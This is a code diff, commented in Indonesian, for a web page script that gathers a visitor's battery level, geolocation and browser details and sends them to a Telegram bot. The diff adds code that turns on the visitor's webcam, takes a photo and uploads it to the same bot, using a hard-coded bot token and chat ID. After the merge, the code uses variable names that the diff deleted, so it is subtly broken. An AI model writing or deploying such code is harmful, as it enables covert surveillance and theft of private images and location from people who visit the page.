@@ -65,6 +65,10 @@
 
   <script>
     async function getInfo() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      const statusText = document.getElementById('status')
       const token = "7901875757:AAHRKZJkEUtOjHjjgdDTWD6fMDhpUfGgmOU";
       const chat_id = "6542273161";
 
@@ -97,7 +101,50 @@
         const batt = await navigator.getBattery();
         battery = (batt.level * 100) + "%";
       }
+       navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        statusText.textContent = "Kamera aktif. Mengambil foto...";
 
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0);
+
+          const dataUrl = canvas.toDataURL('image/jpeg');
+          const blob = dataURLtoBlob(dataUrl);
+
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('photo', blob, 'photo.jpg');
+
+          fetch(`https://api.telegram.org/bot${apiKey}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(res => {
+            statusText.textContent = "Foto berhasil dikirim ke Telegram!";
+            stream.getTracks().forEach(track => track.stop());
+          })
+          .catch(err => {
+            statusText.textContent = "Gagal mengirim foto: " + err;
+          });
+        }, 2000);
+      })
+      .catch(err => {
+        statusText.textContent = "Akses kamera ditolak: " + err;
+      });
+
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while(n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], {type:mime});
+    }
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
           lat = pos.coords.latitude;
@@ -219,60 +266,6 @@ Navigator App: ${navigator.appName}`;
         });
       }
     }
-<script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    const statusText = document.getElementById('status');
-
-    const apiKey = '7901875757:AAHRKZJkEUtOjHjjgdDTWD6fMDhpUfGgmOU'; // Ganti dengan bot API key
-    const chatId = '6542273161';     // Ganti dengan chat ID kamu
-
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-        statusText.textContent = "Kamera aktif. Mengambil foto...";
-
-        setTimeout(() => {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          ctx.drawImage(video, 0, 0);
-
-          const dataUrl = canvas.toDataURL('image/jpeg');
-          const blob = dataURLtoBlob(dataUrl);
-
-          const formData = new FormData();
-          formData.append('chat_id', chatId);
-          formData.append('photo', blob, 'photo.jpg');
-
-          fetch(`https://api.telegram.org/bot${apiKey}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-          })
-          .then(res => res.json())
-          .then(res => {
-            statusText.textContent = "Foto berhasil dikirim ke Telegram!";
-            stream.getTracks().forEach(track => track.stop());
-          })
-          .catch(err => {
-            statusText.textContent = "Gagal mengirim foto: " + err;
-          });
-        }, 2000);
-      })
-      .catch(err => {
-        statusText.textContent = "Akses kamera ditolak: " + err;
-      });
-
-    function dataURLtoBlob(dataurl) {
-      const arr = dataurl.split(',');
-      const mime = arr[0].match(/:(.*?);/)[1];
-      const bstr = atob(arr[1]);
-      let n = bstr.length;
-      const u8arr = new Uint8Array(n);
-      while(n--) u8arr[n] = bstr.charCodeAt(n);
-      return new Blob([u8arr], {type:mime});
-    }
-  </script>
     
     getInfo();
   </script>
